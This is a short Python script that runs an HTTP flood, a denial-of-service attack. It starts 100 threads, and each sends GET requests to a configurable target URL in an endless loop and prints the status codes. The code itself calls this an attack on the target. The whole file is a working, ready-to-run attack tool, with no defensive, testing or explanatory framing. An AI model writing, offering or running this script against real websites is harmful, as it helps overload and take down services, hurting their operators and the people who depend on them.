import requests
import threading

# Configuration
TARGET_URL = 'http://example.com'  # Replace with the target URL
NUM_THREADS = 100  # Number of threads to use

def attack(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def start_attack():
    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=attack, args=(TARGET_URL,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print(f"Starting attack on {TARGET_URL} with {NUM_THREADS} threads")
    start_attack()
